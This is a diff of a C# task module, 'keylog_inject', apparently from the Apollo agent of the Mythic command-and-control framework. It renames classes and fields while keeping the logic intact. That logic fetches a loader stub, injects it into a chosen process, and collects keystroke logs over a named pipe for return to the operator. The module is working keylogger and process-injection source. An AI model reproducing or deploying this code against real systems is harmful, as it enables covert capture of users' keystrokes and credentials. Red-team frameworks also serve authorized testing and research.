@@ -6,15 +6,15 @@
 
 #if KEYLOG_INJECT
 
-using PhantomInterop.Classes;
-using PhantomInterop.Classes.Collections;
-using PhantomInterop.Classes.Core;
-using PhantomInterop.Classes.Events;
-using PhantomInterop.Enums.PhantomEnums;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Serializers;
-using PhantomInterop.Structs.PhantomStructs;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Classes.Collections;
+using ApolloInterop.Classes.Core;
+using ApolloInterop.Classes.Events;
+using ApolloInterop.Enums.ApolloEnums;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Serializers;
+using ApolloInterop.Structs.ApolloStructs;
+using ApolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -39,30 +39,30 @@ namespace Tasks
             [DataMember(Name = "pid")]
             public int PID;
         }
-        private ConcurrentDictionary<string, ChunkStore<DataChunk>> DataStore = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
-        private AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
-        private AutoResetEvent _msgRecvEvent = new AutoResetEvent(false);
+        private ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
+        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
+        private AutoResetEvent _receiverEvent = new AutoResetEvent(false);
         private AutoResetEvent _putFilesEvent = new AutoResetEvent(false);
         private AutoResetEvent _pipeConnected = new AutoResetEvent(false);
 
-        private ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
+        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
         private ThreadSafeList<KeylogInformation> _keylogs = new ThreadSafeList<KeylogInformation>();
         private ConcurrentQueue<byte[]> _putFilesQueue = new ConcurrentQueue<byte[]>();
-        private ConcurrentQueue<ICommandMessage> _msgRecvQueue = new ConcurrentQueue<ICommandMessage>();
-        private JsonHandler _serializer = new JsonHandler();
-        private AutoResetEvent _taskComplete = new AutoResetEvent(false);
+        private ConcurrentQueue<IMythicMessage> _receiverQueue = new ConcurrentQueue<IMythicMessage>();
+        private JsonSerializer _serializer = new JsonSerializer();
+        private AutoResetEvent _complete = new AutoResetEvent(false);
         private Action<object> _putKeylogsAction;
         List<ST.Task<bool>> uploadTasks = new List<ST.Task<bool>>();
 
-        private bool _isFinished = false;
+        private bool _completed = false;
 
-        public keylog_inject(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public keylog_inject(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _putKeylogsAction = (object p) =>
             {
                 PipeStream ps = (PipeStream)p;
-                WaitHandle[] waiters = new WaitHandle[] { _stopToken.Token.WaitHandle, _taskComplete };
-                while (!_stopToken.IsCancellationRequested && !_isFinished)
+                WaitHandle[] waiters = new WaitHandle[] { _cancellationToken.Token.WaitHandle, _complete };
+                while (!_cancellationToken.IsCancellationRequested && !_completed)
                 {
                     WaitHandle.WaitAny(waiters, 10000);
                     KeylogInformation[] keylogs = _keylogs.Flush();
@@ -116,7 +116,7 @@ namespace Tasks
             MythicTaskResponse resp;
             try
             {
-                KeylogInjectParameters parameters = _dataSerializer.Deserialize<KeylogInjectParameters>(_data.Parameters);
+                KeylogInjectParameters parameters = _jsonSerializer.Deserialize<KeylogInjectParameters>(_data.Parameters);
                 if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                     string.IsNullOrEmpty(parameters.PipeName))
                 {
@@ -140,7 +140,7 @@ namespace Tasks
 
                     if (pidRunning)
                     {
-                        if (_agent.GetFileManager().GetFile(_stopToken.Token, _data.ID, parameters.LoaderStubId,
+                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
                                 out byte[] exeAsmPic))
                         {
                             var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
@@ -150,21 +150,21 @@ namespace Tasks
                                     "",
                                     false,
                                     "",
-                                    new ICommandMessage[]
+                                    new IMythicMessage[]
                                     {
                                         Artifact.ProcessInject(parameters.PID,
                                             _agent.GetInjectionManager().GetCurrentTechnique().Name)
                                     }));
                                 AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
-                                client.ConnectionEstablished += OnConnectionReady;
-                                client.MessageReceived += ProcessReceivedMessage;
-                                client.Disconnect += OnConnectionClosed;
+                                client.ConnectionEstablished += Client_ConnectionEstablished;
+                                client.MessageReceived += OnAsyncMessageReceived;
+                                client.Disconnect += Client_Disconnect;
                                 if (client.Connect(3000))
                                 {
                                     WaitHandle[] waiters = new WaitHandle[]
                                     {
-                                        _taskComplete,
-                                        _stopToken.Token.WaitHandle
+                                        _complete,
+                                        _cancellationToken.Token.WaitHandle
                                     };
                                     WaitHandle.WaitAny(waiters);
                                     resp = CreateTaskResponse("", true, "completed");
@@ -204,34 +204,34 @@ namespace Tasks
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
-        private void OnConnectionClosed(object sender, PipeMessageData e)
+        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
         {
             e.Pipe.Close();
-            _isFinished = true;
-            _taskComplete.Set();
+            _completed = true;
+            _complete.Set();
         }
 
-        private void OnConnectionReady(object sender, PipeMessageData e)
+        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
         {
-            System.Threading.Tasks.Task.Factory.StartNew(_putKeylogsAction, e.Pipe, _stopToken.Token);
+            System.Threading.Tasks.Task.Factory.StartNew(_putKeylogsAction, e.Pipe, _cancellationToken.Token);
         }
 
-        private void ProcessReceivedMessage(object sender, PipeMessageData args)
+        private void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
         {
-            DataChunk chunkedData = _dataSerializer.Deserialize<DataChunk>(
+            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                 Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
-            lock (DataStore)
+            lock (MessageStore)
             {
-                if (!DataStore.ContainsKey(chunkedData.ID))
+                if (!MessageStore.ContainsKey(chunkedData.ID))
                 {
-                    DataStore[chunkedData.ID] = new ChunkStore<DataChunk>();
-                    DataStore[chunkedData.ID].MessageComplete += HandleIncomingData;
+                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
+                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                 }
             }
-            DataStore[chunkedData.ID].AddMessage(chunkedData);
+            MessageStore[chunkedData.ID].AddMessage(chunkedData);
         }
 
-        private void HandleIncomingData(object sender, ChunkEventData<DataChunk> args)
+        private void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
             MessageType mt = args.Chunks[0].Message;
             List<byte> data = new List<byte>();
@@ -241,8 +241,8 @@ namespace Tasks
                 data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
             }
 
-            ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
-            
+            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
+            //Console.WriteLine("We got a message: {0}", mt.ToString());
 
             if (msg.GetTypeCode() != MessageType.KeylogInformation)
             {
